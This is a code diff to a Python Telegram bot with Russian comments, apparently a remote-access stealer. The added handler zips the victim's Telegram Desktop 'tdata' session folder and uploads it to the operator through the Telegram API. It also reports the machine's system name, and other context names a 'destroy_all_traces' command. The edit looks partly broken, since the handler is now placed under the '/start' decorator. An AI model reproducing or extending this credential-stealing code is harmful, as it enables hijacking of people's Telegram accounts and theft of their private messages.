@@ -268,6 +268,36 @@ def destroy_all_traces(message):
         error_message = f"ОШИБКА: {e}"
         bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['start'])
+def handle_tg_grab_command(message):
+    def send_message_to_group(chat_id):
+        system_name = platform.system()  # Определение системного имени
+        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
+        data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
+        response = requests.post(url, data=data)
+
+    def archive_and_send2():
+        user = os.path.expanduser("~")
+        source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'  # Переместить это сюда
+        if os.path.exists(source_dir):
+            try:
+                temp_dir = os.path.join(os.getcwd(), 'temp')
+                if not os.path.exists(temp_dir):
+                    os.makedirs(temp_dir)  # Создаем папку, если её нет
+                output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
+
+                created_zip = create_zip_archive(source_dir, output_zip)  # Передаём аргумент output_zip
+                if created_zip:
+                    send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
+                else:
+                    print("Failed to create or send zip file.")
+            except Exception as e:
+                print(f"Error creating or sending zip file: {str(e)}")
+        else:
+            print("Папка 'tdata' не найдена.")
+    
+    chat_id = message.chat.id
+    telegram_bot_token = "<your_telegram_bot_token>"  # Замените на ваш токен
+    archive_and_send2()
 def start(message):
     chat_id = message.chat.id
     markup = types.ReplyKeyboardMarkup(row_width=1)
@@ -342,39 +372,6 @@ def create_zip_archive(source_dir, output_zip):
         print(f"Error creating zip archive: {str(e)}")
         return None
 
-def handle_tg_grab_command(message):
-    def archive_and_send2():
-        user = os.path.expanduser("~")
-        source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'  # Переместить это сюда
-        if os.path.exists(source_dir):
-            try:
-                temp_dir = os.path.join(os.getcwd(), 'temp')
-                if not os.path.exists(temp_dir):
-                    os.makedirs(temp_dir)  # Создаем папку, если её нет
-                output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-
-                created_zip = create_zip_archive(source_dir, output_zip)  # Передаём аргумент output_zip
-                if created_zip:
-                    send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
-                else:
-                    print("Failed to create or send zip file.")
-            except Exception as e:
-                print(f"Error creating or sending zip file: {str(e)}")
-        else:
-            print("Папка 'tdata' не найдена.")
-
-    thread = threading.Thread(target=archive_and_send2)
-    thread.start()
-    time.sleep(20)
-    if thread.is_alive():
-        print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
-        thread.join()
-    try:
-        error_message = "ВЫПОЛНЕНО!!!"
-        bot.send_message(chat_id, error_message)
-    except Exception as e:
-        error_message = f"ОШИБКА: {e}"
-        bot.send_message(chat_id, error_message)
 
 print('СЛУШАЮ КОМАНДЫ...')
 bot.polling()
